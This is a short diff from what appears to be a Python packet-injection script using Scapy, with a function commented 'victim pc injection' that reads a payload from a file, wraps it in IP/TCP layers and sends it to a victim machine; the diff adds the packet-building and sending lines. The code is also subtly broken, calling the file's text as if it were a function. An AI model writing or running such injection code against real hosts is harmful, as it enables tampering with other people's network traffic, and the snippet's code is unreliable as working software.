@@ -41,6 +41,8 @@ def inj(victim): #victim pc injection
     f = open('inject.txt', 'r')
     reqdata = f.read()
     req = reqdata()
+    pkt = ips/tcps/req
+    sr1(pkt, timeout=3, verbose=False)
 mp = myip()
 pkts1 = None
 pkts2 = None
